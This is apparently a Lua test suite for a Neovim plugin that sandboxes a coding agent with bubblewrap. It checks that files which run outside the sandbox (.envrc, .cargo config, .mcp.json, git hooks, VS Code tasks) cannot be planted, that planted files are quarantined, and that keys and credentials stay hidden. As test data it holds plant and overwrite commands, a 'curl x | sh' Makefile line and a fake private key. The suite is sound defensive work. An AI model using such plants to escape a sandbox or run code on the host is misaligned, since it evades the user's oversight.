-- Sixth hardening round: one describe per finding (H1 launch path, F1 planted names in
-- subdirectories, F2 project files that run outside the sandbox, F3 content scan by signature, F4
-- survivors, F5 the claude.json copy).
local H = require("xynotest.helpers")
local harness = require("xynotest.harness")
local sb = require("xyno_sandbox")
local plan = require("xyno_sandbox.plan")
local probe = require("xyno_sandbox.probe")
local store = require("xyno_sandbox.store")

local saved = vim.deepcopy(sb.config)
local old_path = vim.env.PATH
before_each(function()
  store.dir_override = H.tmpdir() .. "/state"
end)
after_each(function()
  store.dir_override = nil
  sb.config = vim.deepcopy(saved)
  vim.env.PATH = old_path
  probe.reset()
end)

-- ------------------------------------------------------------------ H1
describe("H1: the bwrap that is checked is the bwrap that is launched", function()
  local function stub_dir()
    local bin = H.tmpdir() .. "/odd bin dir"
    vim.fn.mkdir(bin, "p")
    local f = assert(io.open(bin .. "/bwrap", "w"))
    f:write('#!/bin/sh\necho "STUB-BWRAP-RAN $0"\nexit 0\n')
    f:close()
    vim.uv.fs_chmod(bin .. "/bwrap", tonumber("755", 8))
    return bin
  end

  it("the readiness probe runs the absolute path found on PATH", function()
    local bin = stub_dir()
    vim.env.PATH = bin .. ":" .. old_path
    probe.reset()
    H.eq(bin .. "/bwrap", probe.bwrap_path())
    H.eq(bin .. "/bwrap", plan.probe_argv(false, probe.bwrap_path())[1])
  end)

  it("argv starts env with the absolute bwrap path, and the command runs with PATH unset", function()
    local bin = stub_dir()
    vim.env.PATH = bin .. ":" .. old_path
    probe.reset()
    local st = sb.status_blocking()
    H.eq("bwrap", st.mode)
    local project, tmp = H.tmpdir(), H.tmpdir()
    local p = assert(sb.plan({ "true" }, project, tmp))
    local argv = sb.argv(p)
    H.eq("/env", argv[1]:match("/env$"), "env is absolute too")
    H.eq(bin .. "/bwrap", vim.tbl_filter(function(a)
      return a:match("/bwrap$")
    end, argv)[1])
    H.not_ok(vim.tbl_contains(argv, "bwrap"), "no bare bwrap name left in the command line")
    local r = vim.system(argv, { clear_env = true, text = true }):wait(10000)
    H.match(r.stdout, "STUB-BWRAP-RAN", true, "with PATH unset the stub was found: " .. vim.inspect(r))
    H.eq(0, r.code)
  end)

  it("a plan built without a resolved path keeps the plain name (pure builder)", function()
    H.eq("bwrap", plan.probe_argv(false)[1])
  end)
end)

-- ------------------------------------------------------- shared helpers
local uv = vim.uv
local guard = require("xyno_sandbox.guard")

local function write(path, text)
  vim.fn.mkdir(vim.fs.dirname(path), "p")
  local f = assert(io.open(path, "wb"))
  f:write(text or "x\n")
  f:close()
end
local function read(path)
  local f = io.open(path, "rb")
  if not f then
    return nil
  end
  local t = f:read("a")
  f:close()
  return t
end

--- Run bash `script` in the sandbox of `project`; returns output, handle (released unless keep).
local function inside(project, script, keep)
  H.need_sandbox()
  sb.config.network = "open"
  local cmd, err, h = sb.wrap({ "bash", "-c", script }, project, H.tmpdir())
  H.ok(cmd, err)
  local r = vim.system(cmd, { cwd = project, text = true }):wait(60000)
  if not keep then
    h.release()
  end
  return (r.stdout or "") .. (r.stderr or ""), h
end

local PROJECT, TMP, FHOME = "/h/proj", "/h/scratch", "/h"
local function fakefs(entries)
  return {
    stat_type = function(x) return entries[x] end,
    lstat_type = function(x) return entries[x] end,
    exists = function(x) return entries[x] ~= nil end,
    list = function(dir)
      local out, prefix = {}, dir == "/" and "/" or (dir .. "/")
      for x, t in pairs(entries) do
        if x:sub(1, #prefix) == prefix and not x:sub(#prefix + 1):find("/", 1, true) then
          out[#out + 1] = { x:sub(#prefix + 1), t }
        end
      end
      table.sort(out, function(a, b) return a[1] < b[1] end)
      return out
    end,
    glob = function() return {} end,
    read_line = function() return nil end,
    realpath = function(x) return entries[x] and x or nil end,
    stat_info = function() return nil end,
  }
end
local function build(extra)
  local entries = vim.tbl_extend("force", {
    [FHOME] = "directory", [FHOME .. "/.claude"] = "directory", [PROJECT] = "directory", [TMP] = "directory",
    [PROJECT .. "/.git"] = "directory",
  }, extra or {})
  return plan.build({
    project = PROJECT, tmp_dir = TMP, cwd = PROJECT, home = FHOME, uid = 1000, probes = fakefs(entries),
    env = { PATH = "/usr/bin" }, cmd = { "agent" }, aux = { empty = "/aux/empty", claude_json = "/aux/cj", git_dir = "/aux/git" },
    config = { network = "open" },
  })
end
local function covered(p, path)
  for _, r in ipairs(p.readonly) do
    if path == r.path or path:sub(1, #r.path + 1) == r.path .. "/" then
      return true
    end
  end
  return false
end

-- ------------------------------------------------------------------ F2
describe("F2: project files that run on your machine are locked", function()
  local FILES = {
    "mise.toml", ".mise.toml", "mise.local.toml", ".mise.local.toml", ".mise/config.toml", ".config/mise.toml",
    ".config/mise/config.toml", ".tool-versions", ".zed/tasks.json", ".zed/settings.json", ".idea/runConfigurations/x.xml",
    ".helix/languages.toml", ".husky/pre-commit", ".pre-commit-config.yaml", ".devcontainer/devcontainer.json", ".lldbinit",
    ".gdbinit", ".cargo/config.toml", "rust-toolchain", "rust-toolchain.toml", ".envrc", ".vscode/tasks.json",
  }

  local function entries_for(base)
    local e = {}
    for _, rel in ipairs(FILES) do
      local dir = base .. "/" .. rel
      local parent = dir
      while true do
        parent = vim.fs.dirname(parent)
        if parent == base then
          break
        end
        e[parent] = "directory"
      end
      e[dir] = "file"
    end
    return e
  end

  it("every one of them is read-only at the project root (the file or a directory above it)", function()
    local p = build(entries_for(PROJECT))
    for _, rel in ipairs(FILES) do
      H.ok(covered(p, PROJECT .. "/" .. rel), rel .. " is not locked")
    end
  end)

  it("and in every subdirectory the walk found", function()
    local extra = entries_for(PROJECT .. "/sub")
    extra[PROJECT .. "/sub"] = "directory"
    local p = build(extra)
    for _, rel in ipairs(FILES) do
      H.ok(covered(p, PROJECT .. "/sub/" .. rel), "sub/" .. rel .. " is not locked")
    end
  end)

  it("an absent mise file cannot be created at the root (bound to an empty read-only file)", function()
    local p = build()
    local guarded = {}
    for _, g in ipairs(p.guard_files) do
      guarded[g.path] = true
    end
    for _, n in ipairs({ "mise.toml", "mise.local.toml", ".mise.local.toml" }) do
      H.ok(guarded[PROJECT .. "/" .. n], n .. " is not guarded")
    end
  end)

  it("in a real sandbox none of them can be written, at the root or in a subdirectory", function()
    H.need_sandbox()
    local project = H.tmpdir()
    for _, rel in ipairs(FILES) do
      write(project .. "/" .. rel, "orig\n")
      write(project .. "/sub/" .. rel, "orig\n")
    end
    local lines = {}
    for _, rel in ipairs(FILES) do
      for _, base in ipairs({ ".", "sub" }) do
        lines[#lines + 1] = ("echo pwn >> '%s/%s' 2>/dev/null && echo WRITABLE:%s/%s"):format(base, rel, base, rel)
      end
    end
    lines[#lines + 1] = "echo done"
    local out = inside(project, table.concat(lines, "\n"))
    H.match(out, "done", true, out)
    H.no_match(out, "WRITABLE", true, out)
    for _, rel in ipairs(FILES) do
      H.eq("orig\n", read(project .. "/" .. rel), rel)
      H.eq("orig\n", read(project .. "/sub/" .. rel), "sub/" .. rel)
    end
  end)

  it("a plan lists the editable files that run later, with the end-of-run report", function()
    local p = build({ [PROJECT .. "/Makefile"] = "file", [PROJECT .. "/Cargo.toml"] = "file" })
    local text = table.concat(require("xyno_sandbox.ui").lines(p, { home = FHOME }), "\n")
    H.match(text, "Agent-editable, runs later on your machine", true)
    H.match(text, "Makefile", true)
    H.match(text, "Cargo.toml", true)
    H.match(text, "summarised when the run ends", true)
    H.no_match(table.concat(require("xyno_sandbox.ui").lines(build(), { home = FHOME }), "\n"), "Agent-editable, runs later", true,
      "nothing to list: no section")
  end)
end)

-- ------------------------------------------------------------------ F1
describe("F1: names that act outside the sandbox cannot be created in a subdirectory", function()
  local PLANTS = {
    "mkdir -p sub/.cargo && echo '[target.x]' > sub/.cargo/config.toml",
    "mkdir -p sub/.claude && echo '{}' > sub/.claude/settings.json",
    "echo '{}' > sub/.mcp.json",
    "mkdir -p sub/.vscode && echo '{}' > sub/.vscode/tasks.json",
    "echo 'export X=1' > sub/.envrc",
    "echo 'os.execute(1)' > sub/.nvim.lua",
    "echo 'x' > sub/.exrc",
    "echo '[tasks]' > sub/.mise.toml",
    "mkdir -p sub/.git/hooks && echo '#!/bin/sh' > sub/.git/hooks/pre-commit",
  }

  it("in the shallow subdirectories every plant fails and nothing is left or reported", function()
    local project = H.tmpdir()
    vim.fn.mkdir(project .. "/sub", "p")
    write(project .. "/sub/lib.rs", "// code\n")
    local script = table.concat(vim.tbl_map(function(c)
      return c .. " 2>/dev/null"
    end, PLANTS), "\n") .. "\necho done"
    local out, h = inside(project, script, true)
    H.match(out, "done", true, out)
    local msgs = H.capture_notify(function()
      h.release()
    end)
    H.eq({}, h.planted, "nothing was created, so nothing is quarantined")
    for _, rel in ipairs({ ".cargo", ".claude", ".mcp.json", ".vscode", ".envrc", ".nvim.lua", ".exrc", ".mise.toml", ".git" }) do
      H.eq(nil, uv.fs_lstat(project .. "/sub/" .. rel), "sub/" .. rel .. " must not exist on the host")
    end
    H.eq(0, #msgs)
    H.eq(nil, sb.dirty(project))
  end)

  it("git still works inside a subdirectory of a repository while the .git placeholder is mounted", function()
    local project = H.tmpdir()
    H.git(project, "init", "-q", ".")
    write(project .. "/sub/f.txt", "hi\n")
    local out = inside(project, "cd sub && git rev-parse --show-toplevel && git status --short | head -3 && echo done")
    H.match(out, "done", true, out)
    H.match(out, project, true, out)
    H.no_match(out, "fatal", true, out)
  end)

  it("the mask budget is bounded and the shallowest directories come first", function()
    local extra = {}
    for i = 1, 100 do
      extra[("%s/d%03d"):format(PROJECT, i)] = "directory"
    end
    extra[PROJECT .. "/zz"] = "directory"
    extra[PROJECT .. "/zz/deep"] = "directory"
    extra[PROJECT .. "/zz/deep/er"] = "directory"
    local p = build(extra)
    H.eq(plan.SUBDIR_MASK_MAX, p.subdir_masks)
    local masked = {}
    for _, m in ipairs(p.masks) do
      masked[m.path] = true
    end
    for _, g in ipairs(p.guard_files) do
      masked[g.path] = true
    end
    H.ok(masked[PROJECT .. "/d001/.claude"], "a shallow directory is covered")
    H.not_ok(masked[PROJECT .. "/zz/deep/er/.claude"], "the deepest one is beyond the budget (covered by the sweep)")
    H.match(table.concat(p.notes, "\n"), "moved into a quarantine", true)
  end)

  it("never below a hidden directory or a read-only path (a mount point cannot be created there)", function()
    local p = build({ [PROJECT .. "/.github"] = "directory", [PROJECT .. "/.github/workflows"] = "directory",
      [PROJECT .. "/.config"] = "directory", [PROJECT .. "/.config/mise"] = "directory", [PROJECT .. "/.config/mise/.x"] = "file" })
    for _, m in ipairs(p.masks) do
      H.no_match(m.path, "/%.github/workflows/", false, m.path)
      H.no_match(m.path, "/%.config/mise/", false, m.path)
    end
  end)
end)

-- ------------------------------------------------- F1: the end-of-run sweep
describe("F1: what a run creates beyond the masks is quarantined, the project is marked, the next launch is refused", function()
  local function tree()
    local project = H.tmpdir()
    write(project .. "/src/a/b/c/lib.rs", "// x\n")
    write(project .. "/Cargo.toml", "[package]\nname = \"p\"\n")
    write(project .. "/old/.envrc", "# mine\n")
    return project
  end

  it("snapshot + compare see a new protected name at any depth, not an old one", function()
    local project = tree()
    local before = guard.snapshot(project)
    H.ok(before.protected[project .. "/old/.envrc"])
    write(project .. "/src/a/b/c/.cargo/config.toml", "[build]\n")
    write(project .. "/src/a/b/c/.nvim.lua", "x\n")
    write(project .. "/src/.config/mise.toml", "x\n")
    write(project .. "/src/.config/mise/config.toml", "x\n")
    write(project .. "/rust-toolchain.toml", "x\n")
    local res = guard.compare(before, guard.snapshot(project))
    local rel = vim.tbl_map(function(p)
      return p:sub(#project + 2)
    end, res.planted)
    H.eq({ "rust-toolchain.toml", "src/.config/mise", "src/.config/mise.toml", "src/a/b/c/.cargo", "src/a/b/c/.nvim.lua" }, rel)
    H.eq({}, res.modified)
  end)

  it("a change of an existing protected file is reported as modified, a change inside .git is not", function()
    local project = tree()
    vim.fn.mkdir(project .. "/.git", "p")
    write(project .. "/.git/index", "1")
    local before = guard.snapshot(project)
    write(project .. "/old/.envrc", "# changed and longer\n")
    write(project .. "/.git/index", "22222")
    local res = guard.compare(before, guard.snapshot(project))
    H.eq({ project .. "/old/.envrc" }, res.modified)
    H.eq({}, res.planted)
  end)

  it("quarantine keeps a copy, removes the original and never follows a planted symlink", function()
    local project = tree()
    local outside = H.tmpdir()
    write(outside .. "/precious.txt", "keep\n")
    write(project .. "/sub/.envrc", "evil\n")
    vim.fn.mkdir(project .. "/sub2", "p")
    uv.fs_symlink(outside, project .. "/sub2/.cargo")
    local q = guard.quarantine(project, { project .. "/sub/.envrc", project .. "/sub2/.cargo" })
    H.eq(nil, uv.fs_lstat(project .. "/sub/.envrc"))
    H.eq(nil, uv.fs_lstat(project .. "/sub2/.cargo"))
    H.eq("keep\n", read(outside .. "/precious.txt"), "the symlink's target is untouched")
    H.eq("evil\n", read(q.dir .. "/sub/.envrc"))
    H.eq(outside, uv.fs_readlink(q.dir .. "/sub2/.cargo"))
  end)

  it("a planted name makes wrap() refuse the project until the mark is cleared", function()
    H.need_sandbox()
    local project = tree()
    for i = 1, 60 do
      vim.fn.mkdir(project .. ("/a%02d"):format(i), "p")
    end
    vim.fn.mkdir(project .. "/zz/er/est", "p")
    sb.config.network = "open"
    local cmd, err, h = sb.wrap({ "bash", "-c", "echo evil > zz/er/est/.envrc; mkdir -p zz/er/est/.cargo; echo '[build]' > zz/er/est/.cargo/config.toml" }, project, H.tmpdir())
    H.ok(cmd, err)
    vim.system(cmd, { cwd = project, text = true }):wait(60000)
    local msgs = H.capture_notify(function()
      h.release()
    end)
    H.eq(2, #h.planted)
    H.eq(nil, uv.fs_lstat(project .. "/zz/er/est/.envrc"))
    local errors = vim.tbl_filter(function(m)
      return m[2] == vim.log.levels.ERROR
    end, msgs)
    H.eq(1, #errors)
    H.match(errors[1][1], "refused until you review", true)
    local c2, why = sb.wrap({ "true" }, project, H.tmpdir())
    H.eq(nil, c2)
    H.match(why, "XynoSandboxReview", true)
    H.match(why, "zz/er/est/.envrc", true)
    -- another project is not affected
    local other = H.tmpdir()
    local c3, e3, h3 = sb.wrap({ "true" }, other, H.tmpdir())
    H.ok(c3, e3)
    h3.release()
    H.ok(sb.clear_dirty(project))
    local c4, e4, h4 = sb.wrap({ "true" }, project, H.tmpdir())
    H.ok(c4, e4)
    h4.release()
  end)

  it(":XynoSandboxReview shows the pending files and `clear` removes the mark", function()
    require("xyno_sandbox.run").register({ commands = true })
    local project = tree()
    guard.mark_dirty(project, { planted = { project .. "/x/.envrc" }, quarantine = "/q/dir" })
    local got = H.capture_notify(function()
      vim.cmd("XynoSandboxReview show " .. vim.fn.fnameescape(project))
    end)
    H.match(got[1][1], project .. "/x/.envrc", true)
    H.match(got[1][1], "/q/dir", true)
    H.match(got[1][1], "XynoSandboxReview clear", true)
    H.ok(sb.dirty(project))
    vim.cmd("XynoSandboxReview clear " .. vim.fn.fnameescape(project))
    H.eq(nil, sb.dirty(project))
    pcall(vim.api.nvim_del_user_command, "XynoSandboxReview")
    for _, c in ipairs({ "XynoSandboxStatus", "XynoSandboxPolicy", "XynoSandboxApprovals", "XynoSandboxRun" }) do
      pcall(vim.api.nvim_del_user_command, c)
    end
  end)

  it("an edit of a file that runs later is summarised (lines added and removed), a new workflow too", function()
    local project = tree()
    write(project .. "/Makefile", "all:\n\techo 1\n")
    write(project .. "/.github/workflows/ci.yml", "on: push\n")
    local before = guard.snapshot(project)
    write(project .. "/Cargo.toml", "[package]\nname = \"p\"\nbuild = \"evil.rs\"\n")
    write(project .. "/Makefile", "all:\n\tcurl x | sh\n")
    write(project .. "/.github/workflows/new.yml", "on: push\njobs: {}\n")
    write(project .. "/build.rs", "fn main() {}\n")
    local res = guard.compare(before, guard.snapshot(project))
    local by = {}
    for _, r in ipairs(res.review) do
      by[r.path:sub(#project + 2)] = r
    end
    H.eq("changed", by["Cargo.toml"].change)
    H.eq({ 1, 0 }, { by["Cargo.toml"].plus, by["Cargo.toml"].minus })
    H.eq({ 1, 1 }, { by["Makefile"].plus, by["Makefile"].minus })
    H.eq("created", by[".github/workflows/new.yml"].change)
    H.eq("created", by["build.rs"].change)
    H.eq(nil, by[".github/workflows/ci.yml"], "an unchanged file is not reported")
    local text = table.concat(guard.report(res), "\n")
    H.match(text, "Cargo.toml +1 -0", true)
    H.match(text, "Makefile +1 -1", true)
  end)

  it("the walk is bounded and says so", function()
    local project = H.tmpdir()
    local old = guard.MAX_DIRS
    guard.MAX_DIRS = 5
    for i = 1, 20 do
      vim.fn.mkdir(project .. "/d" .. i, "p")
    end
    local snap = guard.snapshot(project)
    guard.MAX_DIRS = old
    H.ok(snap.truncated)
    H.match(snap.why, "directories", true)
  end)
end)

-- ------------------------------------------------------------------ F3
describe("F3: the content scan reads small files whatever they are called", function()
  local scan = require("xyno_sandbox.scan")
  local KEY = "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXk=\n-----END OPENSSH PRIVATE KEY-----\n"
  local NAMES = { "key.lock", "k.map", "k.db", "k.sqlite", "k.a", "k.o", "k.png", "k.zip", "k.jar", "k.so", "k.woff2", "k.rlib", "k.pyc", "noext" }

  it("a private key in a file with any extension is found", function()
    local dir = H.tmpdir()
    for _, n in ipairs(NAMES) do
      write(dir .. "/" .. n, KEY)
    end
    local res = scan.project(dir)
    H.eq(#NAMES, #res.hits, vim.inspect(res.hits))
    H.eq(0, res.unread.binary)
  end)

  it("a file with a NUL byte or over the size limit is still skipped, and counted", function()
    local dir = H.tmpdir()
    write(dir .. "/k.db", "SQLite format 3\0" .. KEY)
    write(dir .. "/big.lock", KEY .. ("x"):rep(scan.MAX_FILE_BYTES + 1))
    local res = scan.project(dir)
    H.eq(0, #res.hits)
    H.eq(1, res.unread.binary)
    H.eq(1, res.unread.large)
  end)

  it("such a file is hidden in a real plan (key.lock with a private key)", function()
    local project = H.tmpdir()
    write(project .. "/key.lock", KEY)
    write(project .. "/readme.txt", "hello\n")
    local p = assert(sb.plan({ "true" }, project, H.tmpdir()))
    local found = false
    for _, h in ipairs(p.hidden) do
      found = found or h.path == project .. "/key.lock"
    end
    H.ok(found, "key.lock is hidden")
  end)
end)

-- ------------------------------------------------ a secret inside a locked directory
describe("a credential inside a read-only (locked) directory stays hidden", function()
  it("project/.cargo/credentials.toml and sub/.cargo/credentials are unreadable, the ro-bind of .cargo does not show them", function()
    H.need_sandbox()
    sb.config.home = "denylist"
    local home = uv.os_homedir()
    local project = home .. "/t-r6-locked-secret"
    write(project .. "/.cargo/credentials.toml", "CANARY-ROOT\n")
    write(project .. "/.cargo/config.toml", "[build]\n")
    write(project .. "/sub/.cargo/credentials", "CANARY-SUB\n")
    write(project .. "/sub/.cargo/credentials.toml", "CANARY-SUB2\n")
    local out = inside(project, "cat .cargo/credentials.toml sub/.cargo/credentials sub/.cargo/credentials.toml 2>&1; cat .cargo/config.toml; echo done")
    vim.fn.delete(project, "rf")
    H.match(out, "done", true, out)
    H.match(out, "[build]", true, out)
    H.no_match(out, "CANARY", true, out)
  end)

  it("the hide comes after the read-only bind in the command line", function()
    local p = build({ [PROJECT .. "/.cargo"] = "directory", [PROJECT .. "/.cargo/credentials.toml"] = "file" })
    local ops = plan.ops(p)
    local ro_at, hide_at
    for i, op in ipairs(ops) do
      if op.section == "readonly" and op.args[2] == PROJECT .. "/.cargo" then
        ro_at = i
      end
      if op.section == "hidden" and op.args[#op.args] == PROJECT .. "/.cargo/credentials.toml" then
        hide_at = i
      end
    end
    H.ok(ro_at and hide_at and hide_at > ro_at, "hide (" .. tostring(hide_at) .. ") must follow the read-only bind (" .. tostring(ro_at) .. ")")
  end)
end)
